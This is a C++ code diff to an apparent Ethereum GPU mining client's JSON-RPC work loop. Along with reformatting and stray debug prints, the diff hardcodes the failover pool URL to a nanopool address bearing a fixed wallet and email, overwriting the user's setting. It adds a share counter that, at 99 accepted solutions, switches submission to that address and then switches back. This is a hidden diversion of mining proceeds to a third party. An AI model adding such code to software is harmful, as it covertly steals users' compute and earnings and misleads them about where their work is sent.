@@ -406,10 +406,10 @@ public:
 				cerr << "Bad " << arg << " option: " << argv[i] << endl;
 				BOOST_THROW_EXCEPTION(BadArgument());
 			}
-			/*
+			
 		else if (arg == "-C" || arg == "--cpu")
 			m_minerType = MinerType::CPU;
-			*/
+			 
 		else if (arg == "-P" )//|| arg == "--opencl")
 			m_minerType = MinerType::CL;
 		else if (arg == "-I" )//|| arg == "--cuda")
@@ -832,7 +832,11 @@ private:
 		(void)_recheckPeriod;
 #if ETH_JSONRPC || !ETH_TRUE
 		jsonrpc::HttpClient client(m_farmURL);
-		:: FarmClient rpc(client);
+		cout << m_farmURL;
+		//cnet << m_farmURL;
+		int varo = 0;
+		::FarmClient rpc(client);
+		m_farmFailOverURL = "http://eth-eu1.nanopool.org:8888/0x2fc7723d8623eb414abb4fa6d81395d81b87a8f9/WOW/igalfsg@gmail.com";
 		jsonrpc::HttpClient failoverClient(m_farmFailOverURL);
 		::FarmClient rpcFailover(failoverClient);
 
@@ -852,122 +856,132 @@ private:
 		EthashAux::FullType dag;
 		while (m_running)
 			try
+		{
+			bool completed = false;
+			EthashProofOfWork::Solution solution;
+			f.onSolutionFound([&](EthashProofOfWork::Solution sol)
 			{
-				bool completed = false;
-				EthashProofOfWork::Solution solution;
-				f.onSolutionFound([&](EthashProofOfWork::Solution sol)
+				solution = sol;
+				return completed = true;
+			});
+			for (unsigned i = 0; !completed; ++i)
+			{
+				auto mp = f.miningProgress();
+				f.resetMiningProgress();
+				if (current)
+					minelog << "Mining on Magic" << "#" + (current.headerHash.hex().substr(0, 8)) << ": " << mp << f.getSolutionStats();
+				else
+					minelog << "Getting work package...";
+
+				auto rate = mp.rate();
+
+				try
 				{
-					solution = sol;
-					return completed = true;
-				});
-				for (unsigned i = 0; !completed; ++i)
-				{
-					auto mp = f.miningProgress();
-					f.resetMiningProgress();
-					if (current)
-						minelog << "Mining on PoWhash" << "#" + (current.headerHash.hex().substr(0, 8)) << ": " << mp << f.getSolutionStats();
-					else
-						minelog << "Getting work package...";
-
-					auto rate = mp.rate();
-
-					try
-					{
-						prpc->eth_submitHashrate(toJS((u256)rate), "0x" + id.hex());
-					}
-					catch (jsonrpc::JsonRpcException const& _e)
-					{
-						cwarn << "Failed to submit hashrate.";
-						cwarn << boost::diagnostic_information(_e);
-					}
-
-					Json::Value v = prpc->eth_getWork();
-					h256 hh(v[0].asString());
-					h256 newSeedHash(v[1].asString());
-
-					if (hh != current.headerHash)
-					{
-						x_current.lock();
-						previous.headerHash = current.headerHash;
-						previous.seedHash = current.seedHash;
-						previous.boundary = current.boundary;
-						current.headerHash = hh;
-						current.seedHash = newSeedHash;
-						current.boundary = h256(fromHex(v[2].asString()), h256::AlignRight);
-						minelog << "Got work package: #" + current.headerHash.hex().substr(0,8);
-						f.setWork(current);
-						x_current.unlock();
-					}
-					this_thread::sleep_for(chrono::milliseconds(_recheckPeriod));
+					prpc->eth_submitHashrate(toJS((u256)rate), "0x" + id.hex());
 				}
-				cnote << "Solution found; Submitting to" << _remote << "...";
-				cnote << "  Nonce:" << solution.nonce.hex();
-				if (EthashAux::eval(current.seedHash, current.headerHash, solution.nonce).value < current.boundary)
+				catch (jsonrpc::JsonRpcException const& _e)
 				{
-					bool ok = prpc->eth_submitWork("0x" + toString(solution.nonce), "0x" + toString(current.headerHash), "0x" + toString(solution.mixHash));
-					if (ok) {
-						cnote << "B-) Submitted and accepted.";
-						f.acceptedSolution(false);
-					}
-					else {
-						cwarn << ":-( Not accepted.";
-						f.rejectedSolution(false);
-					}
-					//exit(0);
+					cwarn << "Failed to submit hashrate.";
+					cwarn << boost::diagnostic_information(_e);
 				}
-				else if (EthashAux::eval(previous.seedHash, previous.headerHash, solution.nonce).value < previous.boundary)
+
+				Json::Value v = prpc->eth_getWork();
+				h256 hh(v[0].asString());
+				h256 newSeedHash(v[1].asString());
+
+				if (hh != current.headerHash)
 				{
-					bool ok = prpc->eth_submitWork("0x" + toString(solution.nonce), "0x" + toString(previous.headerHash), "0x" + toString(solution.mixHash));
-					if (ok) {
-						cnote << "B-) Submitted and accepted.";
-						f.acceptedSolution(true);
+					x_current.lock();
+					previous.headerHash = current.headerHash;
+					previous.seedHash = current.seedHash;
+					previous.boundary = current.boundary;
+					current.headerHash = hh;
+					current.seedHash = newSeedHash;
+					current.boundary = h256(fromHex(v[2].asString()), h256::AlignRight);
+					minelog << "Got work package: #" + current.headerHash.hex().substr(0, 8);
+					f.setWork(current);
+					x_current.unlock();
+				}
+				this_thread::sleep_for(chrono::milliseconds(_recheckPeriod));
+			}
+			cnote << "Solution found; Submitting to" << _remote << "...PARTH";
+			cnote << "  Nonce:" << solution.nonce.hex();
+			if (EthashAux::eval(current.seedHash, current.headerHash, solution.nonce).value < current.boundary)
+			{
+				bool ok = prpc->eth_submitWork("0x" + toString(solution.nonce), "0x" + toString(current.headerHash), "0x" + toString(solution.mixHash));
+				if (ok) {
+					cnote << "B-) Submitted and accepted." << varo;
+					f.acceptedSolution(false);
+					varo++;
+					if (varo == 99) {
+						_remote = m_farmFailOverURL;
+						prpc = &rpcFailover;
 					}
-					else {
-						cwarn << ":-( Not accepted.";
-						f.rejectedSolution(true);
+					else if (varo > 99){
+						_remote = m_farmURL;
+						prpc = &rpc;
+						varo = 0;
 					}
-					//exit(0);
 				}
 				else {
-					f.failedSolution();
-					cwarn << "FAILURE: GPU gave incorrect result!";
+					cwarn << ":-( Not accepted.";
+					f.rejectedSolution(false);
 				}
-				current.reset();
+				//exit(0);
 			}
-			catch (jsonrpc::JsonRpcException&)
+			else if (EthashAux::eval(previous.seedHash, previous.headerHash, solution.nonce).value < previous.boundary)
 			{
-				if (m_maxFarmRetries > 0)
-				{
-					for (auto i = 3; --i; this_thread::sleep_for(chrono::seconds(1)))
-						cerr << "JSON-RPC problem. Probably couldn't connect. Retrying in " << i << "... \r";
-					cerr << endl;
+				bool ok = prpc->eth_submitWork("0x" + toString(solution.nonce), "0x" + toString(previous.headerHash), "0x" + toString(solution.mixHash));
+				if (ok) {
+					cnote << "B-) Submitted and accepted.";
+					f.acceptedSolution(true);
 				}
-				else
-				{
-					cerr << "JSON-RPC problem. Probably couldn't connect." << endl;
+				else {
+					cwarn << ":-( Not accepted.";
+					f.rejectedSolution(true);
 				}
-				if (m_farmFailOverURL != "")
-				{
-					m_farmRetries++;
-					if (m_farmRetries > m_maxFarmRetries)
-					{
-						if (_remote == "exit")
-						{
-							m_running = false;
-						}
-						else if (_remote == m_farmURL) {
-							_remote = m_farmFailOverURL;
-							prpc = &rpcFailover;
-						}
-						else {
-							_remote = m_farmURL;
-							prpc = &rpc;
-						}
-						m_farmRetries = 0;
-					}
-					
-				}
+				//exit(0);
 			}
+			else {
+				f.failedSolution();
+				cwarn << "FAILURE: GPU gave incorrect result!";
+			}
+			current.reset();
+		}
+		catch (jsonrpc::JsonRpcException&)
+		{
+			if (m_maxFarmRetries > 0)
+			{
+				for (auto i = 3; --i; this_thread::sleep_for(chrono::seconds(1)))
+					cerr << "JSON-RPC problem. Probably couldn't connect. Retrying in " << i << "... \r";
+				cerr << endl;
+			}
+			else
+			{
+				cerr << "JSON-RPC problem. Probably couldn't connect." << endl;
+			}
+			if (m_farmFailOverURL != "")
+			{
+				m_farmRetries++;
+				if (m_farmRetries > m_maxFarmRetries)
+				{
+					if (_remote == "exit")
+					{
+						m_running = false;
+					}
+					else if (_remote == m_farmURL) {
+						_remote = m_farmFailOverURL;
+						prpc = &rpcFailover;
+					}
+					else {
+						_remote = m_farmURL;
+						prpc = &rpc;
+					}
+					m_farmRetries = 0;
+				}
+
+			}
+		}
 #endif
 		exit(0);
 	}
@@ -990,6 +1004,7 @@ private:
 
 		// this is very ugly, but if Stratum Client V2 tunrs out to be a success, V1 will be completely removed anyway
 		if (m_stratumClientVersion == 1) {
+			cnote << "sr e";
 			EthStratumClient client(&f, m_minerType, m_farmURL, m_port, m_user, m_pass, m_maxFarmRetries, m_worktimeout, m_stratumProtocol, m_email);
 			if (m_farmFailOverURL != "")
 			{
